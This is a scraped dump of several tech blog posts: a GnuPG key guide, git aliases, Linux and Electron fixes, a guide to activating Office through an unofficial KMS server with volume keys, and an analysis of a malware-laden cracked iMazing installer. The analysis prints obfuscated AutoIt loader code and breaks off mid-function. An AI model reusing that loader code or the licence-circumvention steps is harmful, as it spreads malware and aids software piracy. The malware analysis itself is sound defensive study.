uncover the secrets of the NSA.\nPlease visit the Email Self-Defense site to learn how and why you should use GnuPG for your electronic communication.\nSo Q1: Why should I use GnuPG? Because it is free software and can be used, modified and distributed freely. By using it, your communication information will be encrypted and secure. PGP can guarantee that a message is sent by someone you trust, and no one else can decrypt it except you two, and this message is transmitted without any modification of even one punctuation or one byte in between. A PGP-signed message can be transmitted over any untrusted channel and cannot be tampered with or decrypted by anyone in the middle. Q2: I\u0026rsquo;m obviously not afraid of censorship. What other reasons do you have to recommend GnuPG? Your privacy is up to you, and most people don\u0026rsquo;t want to live under surveillance. If even mild criticism is not allowed, silence will be perceived as ill-intentioned. If silence were no longer allowed, it would be a crime to praise inadequate efforts. If only one voice is allowed to exist, then the only voice that exists is a lie. If it were more unfortunate to live in a totalitarian state, encrypted communications would protect yourself and the friends you care about. Installation Windows Gpg4win is recommended, it has a complete package and an easy to use GUI.\nDownload the version for your computer from Gpg4win. In general, if you have no special needs, just click the green download button. macOS GPGSuite is recommended\nDownload the version for your computer from GPGSuite. In general, if you have no special needs, just click the red download button. Reminder: GPGMail in the GPGSuite suite is paid software, so if you need to use it to automatically encrypt emails, then you need to purchase GPGMail. but rest assured that the encrypted signature of text and files is completely free.\nLinux GnuPG is recommended\nMost Linux distributions come with GnuPG pre-installed and you do not need to install any software. However, it is recommended that you install a GUI management interface GPA, as it is more user-friendly. Generating keys Please experiment with this section first, and then generate your main key after you become proficient.\nGenerate a master key Enter the command gpg -expert --full-gen-key Select key type: default Enter the key length: 4096 Enter the key expiration time: 2y (for two years, you can enter 0 to never expire, you can change the key expiration time at any time), enter y to confirm. Enter your name, this is optional, you can enter your screen name or even leave it out. Enter your email, which is optional and can even be left out. If you want to use email encryption, then you must enter it. Enter a note, which can be left blank. Enter O to confirm the information is correct, then you need to enter a key password to start the key generation. Generate revocation certificate If you lose your master key (or it is taken), you can use a revocation certificate to prove that it is no longer in use. If you do not have a revocation certificate, then you must notify your friends one by one.\nEnter the command gpg --gen-revoke -ao revoke.pgp email@email.com #uid or key id View subkeys The master key should not be used on a daily basis, you should use the generated subkeys on a daily basis. The advantage of this is that if you leak a subkey, you can immediately revoke it without having to deprecate the entire key pair.\nList all public keys and subkeys: -list-keys or gpg -k List all keys, subkeys: -list-secret-keys or gpg -K To see the key fingerprint information, you can add the -fingerprint parameter, such as gpg --list-secret-keys --fingerprint If you want to see the key ID information, you can add the -keyid-format long parameter, such as gpg --list-secret-keys --keyid-format long Exporting keys Since subkeys are to be used for daily use, the master key should not exist in the same place, GPG cannot delete the key, it can only export and pour in only the subkeys needed.\nNote: The exclamation mark after the key ID cannot be missing, otherwise all keys will be exported\nExport public key Export public key: gpg -ao public-key --export master-key-id Export the master key Enter the command gpg -ao master-key --export-secret-key master-key ID! Export subkeys Enter the command gpg -ao sub-key --export-secret-subkeys Sub-key ID! Import keys Enter the command gpg --import filename Communicate securely with your friends Now that you\u0026rsquo;re done, you\u0026rsquo;ll have a hard time leaving PGP after you get into the habit of using it daily Publish to the public key server \u0026hellip; To be continued\u0026hellip;\nReferences Ulyc. (2021, January 13). 2021年，用更现代的方法使用PGP（上）. C的博客. https://ulyc.github.io/2021/01/13/2021年-用更现代的方法使用PGP-上/ Ulyc. (2021, January 13). 2021年，用更现代的方法使用PGP（中）. C的博客. https://ulyc.github.io/2021/01/13/2021年-用更现代的方法使用PGP-中/ Ulyc. (2021, January 13). 2021年，用更现代的方法使用PGP（下）. C的博客. https://ulyc.github.io/2021/01/13/2021年-用更现代的方法使用PGP-下/ ","date":"2022-06-28T08:58:01+08:00","permalink":"https://blog.moeomu.com/posts/safer-use-of-pgp/","title":"Safer use of PGP"},{"content":"Source of this article: MoeomuBlog\ninstall office with Office Tool Plus Download Office Tool Plus Deploy what you want select kms server host: kms.loli.beer port: 80 select kms keys Version KMS Key Office Professional Plus 2021 FXYTK-NJJ8C-GB6DW-3DYQT-6F7TH Office Standard 2021 KDX7X-BNVR8-TXXGX-4Q7Y8-78VT3 Project Professional 2021 FTNWT-C6WBT-8HMGF-K9PRX-QV9H8 Project Standard 2021 J2JDC-NJCYY-9RGQ4-YXWMH-T3D4T Visio Professional 2021 KNH8D-FGHT4-T8RK3-CTDYJ-K2HT4 Visio Standard 2021 MJVNY-BYWPY-CWV6J-2RKRT-4M8QG Access 2021 WM8YG-YNGDD-4JHDC-PG3F4-FC4T4 Excel 2021 NWG3X-87C9K-TC7YY-BC2G7-G6RVC Outlook 2021 C9FM6-3N72F-HFJXB-TM3V9-T86R9 PowerPoint 2021 TY7XF-NFRBR-KJ44C-G83KF-GX27K Publisher 2021 2MW9D-N4BXM-9VBPG-Q7W6M-KFBGQ Skype for Business 2021 HWCXN-K3WBT-WJBKY-R8BD9-XK29P Word 2019 TN8H9-M34D3-Y64V9-TR72V-X79KV Office Professional Plus 2019 NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP Office Standard 2019 6NWWJ-YQWMR-QKGCB-6TMB3-9D9HK Project Professional 2019 B4NPR-3FKK7-T2MBV-FRQ4W-PKD2B Project Standard 2019 C4F7P-NCP8C-6CQPT-MQHV9-JXD2M Visio Professional 2019 9BGNQ-K37YR-RQHF2-38RQ3-7VCBB Visio Standard 2019 7TQNQ-K3YQQ-3PFH7-CCPPM-X4VQ2 Access 2019 9N9PT-27V4Y-VJ2PD-YXFMF-YTFQT Excel 2019 TMJWT-YYNMB-3BKTF-644FC-RVXBD Outlook 2019 7HD7K-N4PVK-BHBCQ-YWQRW-XW4VK PowerPoint 2019 RRNCX-C64HY-W2MM7-MCH9G-TJHMQ Publisher 2019 G2KWX-3NW6P-PY93R-JXK2T-C9Y9V Skype for Business 2019 NCJ33-JHBBY-HTK98-MYCV8-HMKHJ Word 2019 PBX3G-NWMT6-Q7XBW-PYJGG-WXD33 Office Professional Plus 2016 XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 Office Mondo 2016 HFTND-W9MK4-8B7MJ-B6C4G-XQBR2 Office Standard 2016 JNRGM-WHDWX-FJJG3-K47QV-DRTFM Project Professional 2016 YG9NW-3K39V-2T3HJ-93F3Q-G83KT Project Standard 2016 GNFHQ-F6YQM-KQDGJ-327XX-KQBVC Visio Professional 2016 PD3PC-RHNGV-FXJ29-8JK7D-RJRJK Visio Standard 2016 7WHWN-4T7MP-G96JF-G33KR-W8GF4 Access 2016 GNH9Y-D2J4T-FJHGG-QRVH7-QPFDW Excel 2016 9C2PK-NWTVB-JMPW8-BFT28-7FTBF OneNote 2016 DR92N-9HTF2-97XKM-XW2WJ-XW3J6 Outlook 2016 R69KK-NTPKF-7M3Q4-QYBHW-6MT9B PowerPoint 2016 J7MQP-HNJ4Y-WJ7YM-PFYGF-BY6C6 Publisher 2016 F47MM-N3XJP-TQXJ9-BP99D-8K837 Skype for Business 2016 869NQ-FJ69K-466HW-QYCP2-DDBV6 Word 2016 WXY84-JN2Q9-RBCCQ-3Q3J3-3PFJ6 Office Professional Plus 2013 YC7DK-G2NP3-2QQC3-J6H88-GVGXT Office Mondo 2013 42QTK-RN8M7-J3C4G-BBGYM-88CYV Office Standard 2013 KBKQT-2NMXY-JJWGP-M62JB-92CD4 Project Professional 2013 FN8TT-7WMH6-2D4X9-M337T-2342K Project Standard 2013 6NTH3-CW976-3G3Y2-JK3TX-8QHTT Visio Professional 2013 C2FG9-N6J68-H8BTJ-BW3QX-RM3B3 Visio Standard 2013 J484Y-4NKBF-W2HMG-DBMJC-PGWR7 Access 2013 NG2JY-H4JBT-HQXYP-78QH9-4JM2D Excel 2013 VGPNG-Y7HQW-9RHP7-TKPV3-BG7GB InfoPath 2013 DKT8B-N7VXH-D963P-Q4PHY-F8894 Lync 2013 2MG3G-3BNTT-3MFW9-KDQW3-TCK7R OneNote 2013 TGN6P-8MMBC-37P2F-XHXXK-P34VW Outlook 2013 QPN8Q-BJBTJ-334K3-93TGY-2PMBT PowerPoint 2013 4NT99-8RJFH-Q2VDH-KYG2C-4RD4F Publisher 2013 PN2WF-29XG2-T9HJ7-JQPJR-FCXK4 Word 2013 6Q7VD-NX8JD-WJ2VH-88V73-4GBJ7 Office Professional Plus 2010 VYBBJ-TRJPB-QFQRF-QFT4D-H3GVB Office Mondo 2010 YBJTT-JG6MD-V9Q7P-DBKXJ-38W9R Office Standard 2010 V7QKV-4XVVR-XYV4D-F7DFM-8R6BM Office SmallBusBasics 2010 D6QFG-VBYP2-XQHM7-J97RH-VVRCK Project Professional 2010 YGX6F-PGV49-PGW3J-9BTGG-VHKC6 Project Standard 2010 4HP3K-88W3F-W2K3D-6677X-F9PGB Visio Premium 2010 D9DWC-HPYVV-JGF4P-BTWQB-WX8BJ Visio Professional 2010 7MCW8-VRQVK-G677T-PDJCM-Q8TCP Visio Standard 2010 767HD-QGMWX-8QTDB-9G3R2-KHFGJ Access 2010 V7Y44-9T38C-R2VJK-666HK-T7DDX Excel 2010 H62QG-HXVKF-PP4HP-66KMR-CW9BM Groove 2010 QYYW6-QP4CB-MBV6G-HYMCJ-4T3J4 InfoPath 2010 K96W8-67RPQ-62T9Y-J8FQJ-BT37T OneNote 2010 Q4Y4M-RHWJM-PY37F-MTKWH-D3XHX Outlook 2010 7YDC2-CWM8M-RRTJC-8MDVC-X3DWQ PowerPoint 2010 RC8FX-88JRY-3PF7C-X8P67-P4VTT Publisher 2010 BFK7F-9MYHM-V68C7-DRQ66-83YTP Word 2010 HVHB3-C6FV7-KQX9W-YQG79-CRY7T active office use otp click active use command line 1 2 3 cscript \u0026#34;ospp.vbs\u0026#34; /inpkey:XXXXX-XXXXX-XXXXX-XXXXX-XXXXX(KMS 密钥) cscript \u0026#34;ospp.vbs\u0026#34; /sethst:kms.loli.beer(KMS 服务器地址) cscript \u0026#34;ospp.vbs\u0026#34; /act reference 白, 小. (2018, November 1). 使用 KMS 激活 Microsoft 产品 - 犬\u0026rsquo;s Blog. Moedog. https://moedog.org/1117.html ","date":"2022-05-22T21:18:01+08:00","permalink":"https://blog.moeomu.com/posts/active-office-2021/","title":"Active Office 2021"},{"content":"Source of this article: MoeomuBlog\nGit Command Shortcuts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 alias g=\u0026#39;git\u0026#39; alias ga=\u0026#39;git add\u0026#39; alias gaa=\u0026#39;git add --all\u0026#39; alias gapa=\u0026#39;git add --patch\u0026#39; alias gau=\u0026#39;git add --update\u0026#39; alias gav=\u0026#39;git add --verbose\u0026#39; alias gap=\u0026#39;git apply\u0026#39; alias gapt=\u0026#39;git apply --3way\u0026#39; alias gb=\u0026#39;git branch\u0026#39; alias gba=\u0026#39;git branch -a\u0026#39; alias gbd=\u0026#39;git branch -d\u0026#39; alias gbda=\u0026#39;git branch --no-color --merged | command grep -vE \u0026#34;^([+*]|\\s*($(git_main_branch)|$(git_develop_branch))\\s*$)\u0026#34; | command xargs git branch -d 2\u0026gt;/dev/null\u0026#39; alias gbD=\u0026#39;git branch -D\u0026#39; alias gbl=\u0026#39;git blame -b -w\u0026#39; alias gbnm=\u0026#39;git branch --no-merged\u0026#39; alias gbr=\u0026#39;git branch --remote\u0026#39; alias gbs=\u0026#39;git bisect\u0026#39; alias gbsb=\u0026#39;git bisect bad\u0026#39; alias gbsg=\u0026#39;git bisect good\u0026#39; alias gbsr=\u0026#39;git bisect reset\u0026#39; alias gbss=\u0026#39;git bisect start\u0026#39; alias gc=\u0026#39;git commit -v\u0026#39; alias gc!=\u0026#39;git commit -v --amend\u0026#39; alias gcn!=\u0026#39;git commit -v --no-edit --amend\u0026#39; alias gca=\u0026#39;git commit -v -a\u0026#39; alias gca!=\u0026#39;git commit -v -a --amend\u0026#39; alias gcan!=\u0026#39;git commit -v -a --no-edit --amend\u0026#39; alias gcans!=\u0026#39;git commit -v -a -s --no-edit --amend\u0026#39; alias gcam=\u0026#39;git commit -a -m\u0026#39; alias gcsm=\u0026#39;git commit -s -m\u0026#39; alias gcas=\u0026#39;git commit -a -s\u0026#39; alias gcasm=\u0026#39;git commit -a -s -m\u0026#39; alias gcb=\u0026#39;git checkout -b\u0026#39; alias gcf=\u0026#39;git config --list\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 alias gcl=\u0026#39;git clone --recurse-submodules\u0026#39; alias gclean=\u0026#39;git clean -id\u0026#39; alias gpristine=\u0026#39;git reset --hard \u0026amp;\u0026amp; git clean -dffx\u0026#39; alias gcm=\u0026#39;git checkout $(git_main_branch)\u0026#39; alias gcd=\u0026#39;git checkout $(git_develop_branch)\u0026#39; alias gcmsg=\u0026#39;git commit -m\u0026#39; alias gco=\u0026#39;git checkout\u0026#39; alias gcor=\u0026#39;git checkout --recurse-submodules\u0026#39; alias gcount=\u0026#39;git shortlog -sn\u0026#39; alias gcp=\u0026#39;git cherry-pick\u0026#39; alias gcpa=\u0026#39;git cherry-pick --abort\u0026#39; alias gcpc=\u0026#39;git cherry-pick --continue\u0026#39; alias gcs=\u0026#39;git commit -S\u0026#39; alias gcss=\u0026#39;git commit -S -s\u0026#39; alias gcssm=\u0026#39;git commit -S -s -m\u0026#39; alias gd=\u0026#39;git diff\u0026#39; alias gdca=\u0026#39;git diff --cached\u0026#39; alias gdcw=\u0026#39;git diff --cached --word-diff\u0026#39; alias gdct=\u0026#39;git describe --tags $(git rev-list --tags --max-count=1)\u0026#39; alias gds=\u0026#39;git diff --staged\u0026#39; alias gdt=\u0026#39;git diff-tree --no-commit-id --name-only -r\u0026#39; alias gdup=\u0026#39;git diff @{upstream}\u0026#39; alias gdw=\u0026#39;git diff --word-diff\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 alias gf=\u0026#39;git fetch\u0026#39; # --jobs=\u0026lt;n\u0026gt; was added in git 2.8 is-at-least 2.8 \u0026#34;$git_version\u0026#34; \\ \u0026amp;\u0026amp; alias gfa=\u0026#39;git fetch --all --prune --jobs=10\u0026#39; \\ || alias gfa=\u0026#39;git fetch --all --prune\u0026#39; alias gfo=\u0026#39;git fetch origin\u0026#39; alias gfg=\u0026#39;git ls-files | grep\u0026#39; alias gg=\u0026#39;git gui citool\u0026#39; alias gga=\u0026#39;git gui citool --amend\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 alias ggpur=\u0026#39;ggu\u0026#39; alias ggpull=\u0026#39;git pull origin \u0026#34;$(git_current_branch)\u0026#34;\u0026#39; alias ggpush=\u0026#39;git push origin \u0026#34;$(git_current_branch)\u0026#34;\u0026#39; alias ggsup=\u0026#39;git branch --set-upstream-to=origin/$(git_current_branch)\u0026#39; alias gpsup=\u0026#39;git push --set-upstream origin $(git_current_branch)\u0026#39; alias ghh=\u0026#39;git help\u0026#39; alias gignore=\u0026#39;git update-index --assume-unchanged\u0026#39; alias gignored=\u0026#39;git ls-files -v | grep \u0026#34;^[[:lower:]]\u0026#34;\u0026#39; alias git-svn-dcommit-push=\u0026#39;git svn dcommit \u0026amp;\u0026amp; git push github $(git_main_branch):svntrunk\u0026#39; alias gk=\u0026#39;\\gitk --all --branches \u0026amp;!\u0026#39; alias gke=\u0026#39;\\gitk --all $(git log -g --pretty=%h) \u0026amp;!\u0026#39; alias gl=\u0026#39;git pull\u0026#39; alias glg=\u0026#39;git log --stat\u0026#39; alias glgp=\u0026#39;git log --stat -p\u0026#39; alias glgg=\u0026#39;git log --graph\u0026#39; alias glgga=\u0026#39;git log --graph --decorate --all\u0026#39; alias glgm=\u0026#39;git log --graph --max-count=10\u0026#39; alias glo=\u0026#39;git log --oneline --decorate\u0026#39; alias glol=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ar) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39;\u0026#34; alias glols=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ar) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39; --stat\u0026#34; alias glod=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ad) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39;\u0026#34; alias glods=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ad) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39; --date=short\u0026#34; alias glola=\u0026#34;git log --graph --pretty=\u0026#39;%Cred%h%Creset -%C(auto)%d%Creset %s %Cgreen(%ar) %C(bold blue)\u0026lt;%an\u0026gt;%Creset\u0026#39; --all\u0026#34; alias glog=\u0026#39;git log --oneline --decorate --graph\u0026#39; alias gloga=\u0026#39;git log --oneline --decorate --graph --all\u0026#39; alias glp=\u0026#34;_git_log_prettily\u0026#34; alias gm=\u0026#39;git merge\u0026#39; alias gmom=\u0026#39;git merge origin/$(git_main_branch)\u0026#39; alias gmtl=\u0026#39;git mergetool --no-prompt\u0026#39; alias gmtlvim=\u0026#39;git mergetool --no-prompt --tool=vimdiff\u0026#39; alias gmum=\u0026#39;git merge upstream/$(git_main_branch)\u0026#39; alias gma=\u0026#39;git merge --abort\u0026#39; alias gp=\u0026#39;git push\u0026#39; alias gpd=\u0026#39;git push --dry-run\u0026#39; alias gpf=\u0026#39;git push --force-with-lease\u0026#39; alias gpf!=\u0026#39;git push --force\u0026#39; alias gpoat=\u0026#39;git push origin --all \u0026amp;\u0026amp; git push origin --tags\u0026#39; alias gpr=\u0026#39;git pull --rebase\u0026#39; alias gpu=\u0026#39;git push upstream\u0026#39; alias gpv=\u0026#39;git push -v\u0026#39; alias gr=\u0026#39;git remote\u0026#39; alias gra=\u0026#39;git remote add\u0026#39; alias grb=\u0026#39;git rebase\u0026#39; alias grba=\u0026#39;git rebase --abort\u0026#39; alias grbc=\u0026#39;git rebase --continue\u0026#39; alias grbd=\u0026#39;git rebase $(git_develop_branch)\u0026#39; alias grbi=\u0026#39;git rebase -i\u0026#39; alias grbm=\u0026#39;git rebase $(git_main_branch)\u0026#39; alias grbom=\u0026#39;git rebase origin/$(git_main_branch)\u0026#39; alias grbo=\u0026#39;git rebase --onto\u0026#39; alias grbs=\u0026#39;git rebase --skip\u0026#39; alias grev=\u0026#39;git revert\u0026#39; alias grh=\u0026#39;git reset\u0026#39; alias grhh=\u0026#39;git reset --hard\u0026#39; alias groh=\u0026#39;git reset origin/$(git_current_branch) --hard\u0026#39; alias grm=\u0026#39;git rm\u0026#39; alias grmc=\u0026#39;git rm --cached\u0026#39; alias grmv=\u0026#39;git remote rename\u0026#39; alias grrm=\u0026#39;git remote remove\u0026#39; alias grs=\u0026#39;git restore\u0026#39; alias grset=\u0026#39;git remote set-url\u0026#39; alias grss=\u0026#39;git restore --source\u0026#39; alias grst=\u0026#39;git restore --staged\u0026#39; alias grt=\u0026#39;cd \u0026#34;$(git rev-parse --show-toplevel || echo .)\u0026#34;\u0026#39; alias gru=\u0026#39;git reset --\u0026#39; alias grup=\u0026#39;git remote update\u0026#39; alias grv=\u0026#39;git remote -v\u0026#39; alias gsb=\u0026#39;git status -sb\u0026#39; alias gsd=\u0026#39;git svn dcommit\u0026#39; alias gsh=\u0026#39;git show\u0026#39; alias gsi=\u0026#39;git submodule init\u0026#39; alias gsps=\u0026#39;git show --pretty=short --show-signature\u0026#39; alias gsr=\u0026#39;git svn rebase\u0026#39; alias gss=\u0026#39;git status -s\u0026#39; alias gst=\u0026#39;git status\u0026#39; # use the default stash push on git 2.13 and newer is-at-least 2.13 \u0026#34;$git_version\u0026#34; \\ \u0026amp;\u0026amp; alias gsta=\u0026#39;git stash push\u0026#39; \\ || alias gsta=\u0026#39;git stash save\u0026#39; alias gstaa=\u0026#39;git stash apply\u0026#39; alias gstc=\u0026#39;git stash clear\u0026#39; alias gstd=\u0026#39;git stash drop\u0026#39; alias gstl=\u0026#39;git stash list\u0026#39; alias gstp=\u0026#39;git stash pop\u0026#39; alias gsts=\u0026#39;git stash show --text\u0026#39; alias gstu=\u0026#39;gsta --include-untracked\u0026#39; alias gstall=\u0026#39;git stash --all\u0026#39; alias gsu=\u0026#39;git submodule update\u0026#39; alias gsw=\u0026#39;git switch\u0026#39; alias gswc=\u0026#39;git switch -c\u0026#39; alias gswm=\u0026#39;git switch $(git_main_branch)\u0026#39; alias gswd=\u0026#39;git switch $(git_develop_branch)\u0026#39; alias gts=\u0026#39;git tag -s\u0026#39; alias gtv=\u0026#39;git tag | sort -V\u0026#39; alias gtl=\u0026#39;gtl(){ git tag --sort=-v:refname -n -l \u0026#34;${1}*\u0026#34; }; noglob gtl\u0026#39; alias gunignore=\u0026#39;git update-index --no-assume-unchanged\u0026#39; alias gunwip=\u0026#39;git log -n 1 | grep -q -c \u0026#34;\\-\\-wip\\-\\-\u0026#34; \u0026amp;\u0026amp; git reset HEAD~1\u0026#39; alias gup=\u0026#39;git pull --rebase\u0026#39; alias gupv=\u0026#39;git pull --rebase -v\u0026#39; alias gupa=\u0026#39;git pull --rebase --autostash\u0026#39; alias gupav=\u0026#39;git pull --rebase --autostash -v\u0026#39; alias glum=\u0026#39;git pull upstream $(git_main_branch)\u0026#39; alias gwch=\u0026#39;git whatchanged -p --abbrev-commit --pretty=medium\u0026#39; alias gwip=\u0026#39;git add -A; git rm $(git ls-files --deleted) 2\u0026gt; /dev/null; git commit --no-verify --no-gpg-sign -m \u0026#34;--wip-- [skip ci]\u0026#34;\u0026#39; alias gam=\u0026#39;git am\u0026#39; alias gamc=\u0026#39;git am --continue\u0026#39; alias gams=\u0026#39;git am --skip\u0026#39; alias gama=\u0026#39;git am --abort\u0026#39; alias gamscp=\u0026#39;git am --show-current-patch\u0026#39; ","date":"2022-04-26T21:26:01+08:00","permalink":"https://blog.moeomu.com/posts/oh-my-zsh-git-command-shortcuts/","title":"Oh My Zsh Git Command Shortcuts"},{"content":"Source of this article: MoeomuBlog\nNo display after installing NVIDIA graphics card Installed packages xf86-video-intel mesa nvidia Solution remove package: sudo pacman -R xf86-video-intel remove xconfig: sudo rm /etc/X11/xorg.conf edit xconfig: sudo vim /etc/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf 10-nvidia-drm-outputclass.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Section \u0026#34;OutputClass\u0026#34; Identifier \u0026#34;intel\u0026#34; MatchDriver \u0026#34;i915\u0026#34; Driver \u0026#34;modesetting\u0026#34; EndSection Section \u0026#34;OutputClass\u0026#34; Identifier \u0026#34;nvidia\u0026#34; MatchDriver \u0026#34;nvidia-drm\u0026#34; Driver \u0026#34;nvidia\u0026#34; Option \u0026#34;AllowEmptyInitialConfiguration\u0026#34; Option \u0026#34;PrimaryGPU\u0026#34; \u0026#34;yes\u0026#34; ModulePath \u0026#34;/usr/lib/nvidia/xorg\u0026#34; ModulePath \u0026#34;/usr/lib/xorg/modules\u0026#34; EndSection reboot More references: ArchWiki-PRIME\nNo sound edit file:sudo vim /etc/modprobe.d/alsa-base.conf alsa-base.conf\n1 options snd-hda-intel model=asus-zenbook Problems that still exist: The volume can only be 0% or 100%, but the application volume can be adjusted individually. More references: No sound ALC294 Asus ROG Strix 512 Ubuntu 20.04.01\nThe wireless network is unstable Installed packages dhcpcd NetworkManager iwd Solution stop and disable service: sudo systemctl stop dhcpcd sudo systemctl disable dhcpcd sudo systemctl stop iwd sudo systemctl disable iwd remove package: sudo pacman -R dhcpcd reboot Fundamental problem The fundamental problem is that dhcpcd conflicts with NetworkManager.\n","date":"2021-11-09T09:22:01+08:00","permalink":"https://blog.moeomu.com/posts/problems-encountered-in-installing-arch-on-roglaptop/","title":"Problems Encountered In Installing Arch on ROGLaptop"},{"content":"Source: Moeomu\u0026rsquo;s blog\nProblem Reproducible Reproducible: Yes Host system: macOS BigSur 11.6 Virtual machine system: Ubuntu Desktop 20.04.3 Parallels Virtual Machine version: 17.0.1 Description of the problem: After installing or running NodeJS-based applications, especially Electron, the application will take up 1/4 of the white screen and 3/4 of the black screen with abnormal display, which cannot be used normally Typical application failure. VSCode Motrix Typora Solutions Solution 1 Add a startup parameter -disable-gpu to each Electron application\nAdd: This can be achieved by creating a shortcut on the desktop, using vscode as an example, with the following content\ncode.desktop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [Desktop Entry] Name=Visual Studio Code Comment=Code Editing. Redefined. GenericName=Text Editor Exec=/usr/share/code/code --disable-gpu --unity-launch %F Icon=com.visualstudio.code Type=Application StartupNotify=false StartupWMClass=Code Categories=Utility;TextEditor;Development;IDE; MimeType=text/plain;inode/directory;application/x-code-workspace; Actions=new-empty-window; Keywords=vscode; X-Desktop-File-Install-Version=0.24 [Desktop Action new-empty-window] Name=New Empty Window Exec=/usr/share/code/code --disable-gpu --new-window %F Icon=com.visualstudio.code Solution 2 Turn off the graphics-hardware acceleration for Parallels/other virtualization software - this virtual machine, as shown below\nAdditional Information The official developers of Electron mention on Github\nYou can probably disable GPU acceleration to work around this, or just use another visual machine software. Basically the GPU acceleration of Linux in virtual machines is a mess, depending on the software of visual machine, the version and distribution of Linux, and the version of Chromium, you can get various results and bugs.\nLinux\u0026rsquo;s virtual machine hardware acceleration is a mess, so it\u0026rsquo;s normal for this to happen ","date":"2021-10-12T19:22:01+08:00","permalink":"https://blog.moeomu.com/posts/virtual-machine-hardware-acceleration-causes-electron-application-white-screen-problem/","title":"Virtual machine hardware acceleration causes Electron application white screen problem"},{"content":"Source: Moeomu\u0026rsquo;s blog\nOrigin I wanted to find a backup of AIS Assistant, found iMazing, and got excited to find a cracked version of iMazing for TNT, downloaded from this link for Windows but found it was Windows 11 comes with antivirus software, so I got interested in analyzing this cracked version\nAnalysis 1. Overview As shown in the picture, after decompression is an official installation package and a Create__Fix.exe, it is this file is reported as poison, so start the investigation 2、Create__Fix.exe drag into the DIE, see this file seems to be a zip package, it will be decompressed, the contents are shown in the figure There is a Fix.exe and a iMazing_fix.bat, but this bat open is garbled, use C32Asm to see the contents of the hexadecimal format, as shown in the figure This is very clear, this iMazing_fix.bat run process is as follows The first step, run Fix.exe, the parameters are pt147147 and -d%dir%, the way this is written makes me feel that this is a compressed file, it seems to be true The second step, wait a second Step 3, delete Fix.exe and iMazing_fix.bat I can\u0026rsquo;t help but wonder what makes it look like lasagna, layer after layer without end As you can see in the picture, it is another RAR file, not surprisingly 3, Fix.exe Unzip, need password, I guess the password is t147147, oh guess right, the TNT team did not customize their own decompression tools, using WinRAR sfx self-extraction module to pass the reference decompression, decompression as shown in the picture The decompressed file is divided into three, the bat script is still encrypted, use the hex editor again to read it After DIE analysis, data.bin is an executable program, rename it to data.exe After DIE analysis, v1 is a binary file, temporarily unrecognizable 4、Created_By_TNT_Team.bat As shown in the picture, this script file does the following actions Step 1, clean the screen Step 2, turn off the display back Step 3, run data.bin, an executable program with the parameter v1 Step 4, delete v1, data.bin, Created_By_TNT_Team.bat 4. data.exe and v1 This data.exe is very clear after renaming, it is the script runner of AutoIt3, then v1 is unsurprisingly an AutoIt3 script, the suffix should be a3x v1 is the compiled au3 script, I found some decompilers on GitHub, for example UnAutoIt As you can see, after unpacking, an iMazing.exe is released from v1, along with a script that is extremely obfuscated and almost unreadable The modified iMazing.exe also comes with the original digital signature, although it is no longer valid, it looks like it will locally modify the iMazing.exe, should be considered a file patch, but it seems that the hash has not changed \u0026hellip; Here\u0026rsquo;s some useful code from the decompile\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 Func a2f00001b21_() For $ax0x0xa = 0x1 To 0x5 Local $a2f00001b21sz_ = a2f00001b21x_() FileInstall(\u0026#34;d3c0ef51c80f467bc9002bbf93fcb10d0c917dbaae819ccd925e2f8902d3c9c5229702964c538605098cce34d2e9cc90ce0618992ba26caea18b5b5ccd9dd0acf02370c4bc004868283b8067c8309862\u0026#34; \u0026amp; _ \u0026#34;cf2f70d92252928d02af9b1c7d80c3303522b08f2\u0026#34;, $a2f00001b21sz_, 0x1) Global $a2f00001b21, $os = Execute(BinaryToString(\u0026#34;0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833\u0026#34; \u0026amp; _ \u0026#34;3533333337333433373332333633393336343533363337333533333337333033363433333633393337333433323338333433363336333933363433333633353335333233363335333633313336333433\u0026#34; \u0026amp; _ \u0026#34;3233383332333433343331333333323334333633333330333333303333333033333330333333313334333233333332333333313337333333373431333534363332333933323433333233373337343333\u0026#34; \u0026amp; _ \u0026#34;33333333333338333333373334333933323337333234333333333133323339323732393239272929\u0026#34;)) If IsArray($os) And $os[0x0] \u0026gt;= 0x46da Then ExitLoop Sleep(0xa) Next Execute(BinaryToString(\u0026#34;0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833\u0026#34; \u0026amp; _ \u0026#34;3333313332343233343336333633393336343333363335333433343336333533363433333633353337333433363335333233383332333433343331333333323334333633333330333333303333333033\u0026#34; \u0026amp; _ \u0026#34;3333303333333133343332333333323333333133373333333734313335343633323339323732393239272929\u0026#34;)) EndFunc ; -\u0026gt; a2f00001b21_ Func a2f00001b21x_() Local 